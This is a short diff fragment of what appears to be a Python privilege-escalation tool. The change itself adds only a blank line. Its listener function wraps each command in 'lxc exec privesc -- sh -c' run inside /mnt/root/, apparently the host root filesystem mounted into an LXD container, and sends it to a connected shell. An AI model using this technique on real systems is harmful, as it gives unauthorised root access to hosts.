@@ -60,6 +60,7 @@ def listen(ip,port, t2, r_port, file_name):
 			
 			if command != "":
 				command = "lxc exec privesc -- sh -c \"cd /mnt/root/ && " + command + "\""
+			
 			command += '\n'
 			conn.send(command.encode())
 			time.sleep(0.4)
